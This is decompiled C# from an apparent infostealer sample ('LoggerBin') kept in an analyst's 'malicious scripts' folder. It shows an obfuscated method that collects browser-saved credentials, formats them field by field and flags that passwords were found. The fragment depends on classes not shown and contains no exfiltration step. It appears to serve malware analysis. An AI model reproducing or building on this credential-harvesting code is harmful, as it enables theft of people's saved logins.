// Decompiled with JetBrains decompiler
// Type: up.An
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using rw;
using System;
using System.Collections.Generic;
using System.Text;
using VW1;

namespace up
{
  internal class An
  {
    internal static An OTD;

    public static string gWJ()
    {
      string str;
      try
      {
        if (Convert.ToBoolean(XWr.EnableBrowserRecovery))
        {
          List<NT> ntList = Tu.bx(Tu.yxQ);
          StringBuilder stringBuilder = new StringBuilder();
          foreach (NT nt in ntList)
          {
            stringBuilder.AppendLine(w4.bx(4656, w4.vY) + JC.bx((object) nt, JC.TU));
            stringBuilder.AppendLine(w4.bx(1176, w4.vY) + JC.bx((object) nt, JC.fa));
            stringBuilder.AppendLine(w4.bx(1200, w4.vY) + JC.bx((object) nt, JC.Mv));
            stringBuilder.AppendLine(w4.bx(4992, w4.vY) + JC.bx((object) nt, JC.lxP));
            stringBuilder.AppendLine(w4.bx(1270, w4.vY));
          }
          if (string.IsNullOrWhiteSpace(stringBuilder.ToString()))
          {
            str = w4.bx(7122, w4.vY);
            goto label_15;
          }
          else
          {
            XWr.IsPass = true;
            str = stringBuilder.ToString();
            int num1 = 0;
            if (!An.DTc())
              goto label_9;
label_2:
            switch (num1)
            {
              default:
                goto label_15;
            }
label_9:
            int num2;
            num1 = num2;
            goto label_2;
          }
        }
        else
        {
          str = w4.bx(666, w4.vY);
          goto label_15;
        }
      }
      catch
      {
      }
      return "";
label_15:
      return str;
    }

    public An()
    {
      yd.bx(yd.EI);
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static bool DTc() => An.OTD == null;

    internal static An wT9() => An.OTD;
  }
}
